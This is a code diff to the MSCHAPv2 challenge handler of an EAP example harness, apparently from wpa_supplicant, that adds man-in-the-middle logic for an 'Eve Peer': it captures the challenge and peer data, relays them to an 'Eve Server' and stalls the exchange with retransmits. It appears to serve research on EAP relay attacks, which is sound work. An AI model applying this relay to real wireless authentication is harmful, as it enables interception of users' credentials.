@@ -288,13 +288,59 @@ static struct wpabuf * eap_mschapv2_challenge(
 
 	static int k = 10;
 
-	if (eap_example_get_instance_name(sm) == EVE_PEER && --k > 0) {
-		printf("k = %d\n", k);
-		ret->ignore = TRUE;
-		ret->decision = DECISION_FAIL;
-		eap_example_mitm_retransmit(sm);
+	if (eap_example_get_instance_name(sm) == EVE_PEER) {
+		if (k > 0) {
+			--k;
+		}
 
-		return NULL;
+		if (k == 0) {
+			k = -1;
+		}
+
+		if (k == 9) {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Init delay loop for Eve Peer");
+		}
+
+	        if (k > 0) {
+			struct instance_data * self =
+				eap_example_get_instance_data(sm);
+
+			struct wpabuf *buf;
+
+			switch(self->mitm_protocol_state) {
+			case 0x1:
+				buf = wpabuf_alloc(2 + challenge_len + len);
+				wpabuf_put_u8(buf, challenge_len);
+				wpabuf_put_data(buf, challenge, challenge_len);
+				wpabuf_put_u8(buf, len);
+				wpabuf_put_data(buf, pos, len);
+				self->mitm_data = buf;
+				self->mitm_protocol_state = 0x2;
+				eap_example_mitm_peer_tx(self);
+
+				wpa_printf(MSG_DEBUG,
+					   "MITM: Send MSCHAPv2 "
+					   "Challenge to Eve Server");
+				break;
+			default:
+				break;
+			}
+		}
+
+		if (k > 0) {
+			ret->ignore = TRUE;
+			ret->decision = DECISION_FAIL;
+			eap_example_mitm_retransmit(sm);
+
+			return NULL;
+		}
+
+		if (k == -1) {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: End delay loop for Eve Peer");
+			k = -2;
+		}
 	}
 
 	ret->ignore = FALSE;
